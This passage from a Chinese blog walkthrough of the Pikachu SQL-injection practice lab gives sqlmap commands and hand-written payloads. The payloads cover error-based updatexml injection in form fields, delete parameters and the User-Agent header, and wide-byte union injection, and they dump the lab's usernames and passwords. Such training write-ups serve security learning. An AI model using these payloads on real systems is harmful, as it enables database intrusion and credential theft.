+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python sqlmap.py -u &quot;http://pikachu:<span class="hljs-number">8848</span>/vul/sqli/sqli_search.php?name=<span class="hljs-number">00</span>&amp;submit=<span class="hljs-variable">%E6%</span><span class="hljs-number">90</span><span class="hljs-variable">%9C%</span>E7<span class="hljs-variable">%B4%</span>A2&quot; -D &quot;pikachu&quot; --tables<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E7%88%86%E8%A1%A8.png" srcset="/img/dog.gif" lazyload alt="爆表"></p>
+<ul>
+<li>爆字段名</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python sqlmap.py -u &quot;http://pikachu:<span class="hljs-number">8848</span>/vul/sqli/sqli_search.php?name=<span class="hljs-number">00</span>&amp;submit=<span class="hljs-variable">%E6%</span><span class="hljs-number">90</span><span class="hljs-variable">%9C%</span>E7<span class="hljs-variable">%B4%</span>A2&quot; -D &quot;pikachu&quot; -T &quot;users&quot; --columns<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D.png" srcset="/img/dog.gif" lazyload alt="爆字段名"></p>
+<ul>
+<li>爆数据</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python sqlmap.py -u &quot;http://pikachu:<span class="hljs-number">8848</span>/vul/sqli/sqli_search.php?name=<span class="hljs-number">00</span>&amp;submit=<span class="hljs-variable">%E6%</span><span class="hljs-number">90</span><span class="hljs-variable">%9C%</span>E7<span class="hljs-variable">%B4%</span>A2&quot; -D &quot;pikachu&quot; -T &quot;users&quot; -C &quot;password,username&quot; --dump<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E7%88%86%E6%95%B0%E6%8D%AE.png" srcset="/img/dog.gif" lazyload alt="爆数据"></p>
+<h4 id="（5）、xx型注入"><a href="#（5）、xx型注入" class="headerlink" title="（5）、xx型注入"></a>（5）、xx型注入</h4><ul>
+<li>与上一步一样，直接sqlmap跑就行了&#x2F;</li>
+</ul>
+<h4 id="（6）、insert-update注入"><a href="#（6）、insert-update注入" class="headerlink" title="（6）、insert&#x2F;update注入"></a>（6）、insert&#x2F;update注入</h4><ul>
+<li>首先先注册</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E5%85%88%E6%B3%A8%E5%86%8C.png" srcset="/img/dog.gif" lazyload alt="先注册"></p>
+<ul>
+<li>注册时抓包</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%B3%A8%E5%86%8C%E6%97%B6%E6%8A%93%E5%8C%85.png" srcset="/img/dog.gif" lazyload alt="注册时抓包"></p>
+<ul>
+<li>试一下sqlmap</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python sqlmap.py -u &quot;http://pikachu:<span class="hljs-number">8848</span>/vul/sqli/sqli_iu/sqli_reg.php&quot; --data &quot;username=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&amp;sex=<span class="hljs-number">1</span>&amp;phonenum=<span class="hljs-number">1</span>&amp;email=<span class="hljs-number">1</span>&amp;add=<span class="hljs-number">1</span>&amp;submit=submit&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/sqlmap%E8%B7%91.png" srcset="/img/dog.gif" lazyload alt="sqlmap跑"></p>
+<ul>
+<li>再试一下手注</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">username=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%89%8B%E5%8A%A8%E6%88%90%E5%8A%9F.png" srcset="/img/dog.gif" lazyload alt="手动成功"></p>
+<ul>
+<li>查表</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">username=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%89%8B%E5%8A%A8%E6%9F%A5%E8%A1%A8.png" srcset="/img/dog.gif" lazyload alt="手动查表"></p>
+<ul>
+<li>查字段名</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">username=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27;),0x7e),1) and&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%89%8B%E5%8A%A8%E5%AD%97%E6%AE%B5%E5%90%8D.png" srcset="/img/dog.gif" lazyload alt="手动字段名"></p>
+<ul>
+<li>查数据</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">username=<span class="hljs-number">1</span><span class="hljs-string">&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(id,&#x27;</span>:<span class="hljs-string">&#x27;,username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users),1,31),0x7e),1) and&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%89%8B%E5%8A%A8%E6%95%B0%E6%8D%AE.png" srcset="/img/dog.gif" lazyload alt="手动数据"></p>
+<h4 id="（7）、delete注入"><a href="#（7）、delete注入" class="headerlink" title="（7）、delete注入"></a>（7）、delete注入</h4><ul>
+<li>首先留言</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E9%A6%96%E5%85%88%E7%95%99%E8%A8%80.png" srcset="/img/dog.gif" lazyload alt="首先留言"></p>
+<ul>
+<li>删除时抓包</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E5%9C%A8id%E5%A4%84%E6%B3%A8%E5%85%A5.png" srcset="/img/dog.gif" lazyload alt="在id处注入"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">58</span>+<span class="hljs-keyword">and</span>+<span class="hljs-title function_ invoke__">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">concat</span>(<span class="hljs-number">0x7e</span>,(select+<span class="hljs-title function_ invoke__">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%B3%A8%E5%85%A5.png" srcset="/img/dog.gif" lazyload alt="注入"></p>
+<p>后面和前面的注入相同</p>
+<h4 id="（8）、http头注入"><a href="#（8）、http头注入" class="headerlink" title="（8）、http头注入"></a>（8）、http头注入</h4><ul>
+<li>按照提示登陆</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E7%99%BB%E5%BD%95.png" srcset="/img/dog.gif" lazyload alt="登录"></p>
+<ul>
+<li>重新登陆并抓包</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E9%94%99%E5%8C%85.png" srcset="/img/dog.gif" lazyload alt="错包"></p>
+<ul>
+<li>放掉这个抓下一个</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%83%B3%E8%A6%81%E7%9A%84%E5%8C%85.png" srcset="/img/dog.gif" lazyload alt="想要的包"></p>
+<ul>
+<li>对UA头进行报错注入</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent: <span class="hljs-number">1</span><span class="hljs-string">&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/ua%E6%88%90%E5%8A%9F.png" srcset="/img/dog.gif" lazyload alt="ua成功"></p>
+<p>（9）、基于boolian的盲注和基于时间的盲注</p>
+<ul>
+<li>都直接用sqlmap跑就行</li>
+</ul>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">python sqlmap.py -u <span class="hljs-string">&quot;http://pikachu:8848/vul/sqli/sqli_blind_b.php?name=1&amp;submit=<span class="hljs-variable">%E</span>6%9F<span class="hljs-variable">%A</span>5<span class="hljs-variable">%E</span>8%AF<span class="hljs-variable">%A2</span>&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/sqlmap.png" srcset="/img/dog.gif" lazyload alt="sqlmap"></p>
+<ul>
+<li>爆表</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">python sqlmap.py -u <span class="hljs-string">&quot;http://pikachu:8848/vul/sqli/sqli_blind_b.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --dbs<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E8%B7%91%E5%87%BA%E6%9D%A5.png" srcset="/img/dog.gif" lazyload alt="跑出来"></p>
+<h4 id="（9）、wide-byte注入"><a href="#（9）、wide-byte注入" class="headerlink" title="（9）、wide byte注入"></a>（9）、wide byte注入</h4><ul>
+<li>原理</li>
+</ul>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">宽字节注入利用<span class="hljs-built_in">Unicode</span>编码中的特性，将特殊字符转换为双字节字符，绕过输入过滤和检查，从而执行恶意的SQL查询<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>随便查一个然后抓包</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%8A%93%E5%8C%85.png" srcset="/img/dog.gif" lazyload alt="宽字节抓包"></p>
+<ul>
+<li>构造payload</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">name=<span class="hljs-number">1</span>%df<span class="hljs-string">&#x27; union select version(),database() --+</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%9F%A5%E5%BA%93.png" srcset="/img/dog.gif" lazyload alt="查库"></p>
+<ul>
+<li>查表</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">name=<span class="hljs-number">1</span>%df<span class="hljs-string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%9F%A5%E8%A1%A8.png" srcset="/img/dog.gif" lazyload alt="宽字节查表"></p>
+<ul>
+<li>查字段名</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">name=<span class="hljs-number">1</span>%df<span class="hljs-string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273--+</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%9F%A5%E5%AD%97%E6%AE%B5%E5%90%8D.png" srcset="/img/dog.gif" lazyload alt="宽字节查字段名"></p>
+<ul>
+<li>爆数据</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">name=<span class="hljs-number">1</span>%df<span class="hljs-string">&#x27; union select group_concat(username),group_concat(password) from pikachu.users --+</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%95%B0%E6%8D%AE.png" srcset="/img/dog.gif" lazyload alt="宽字节数据"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" class="category-chain-item">靶场实战</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AE%9E%E8%B7%B5/" class="print-no-link">#实践</a>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA/" class="print-no-link">#靶场</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Pikachu靶场全通关（四）</div>
+      <div>http://example.com/2025/03/11/Pikachu靶场全通关（四）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zizhu</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/06/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E4%B8%89%EF%BC%89/" title="Pikachu靶场全通关（三）">
+                        <span class="hidden-mobile">Pikachu靶场全通关（三）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
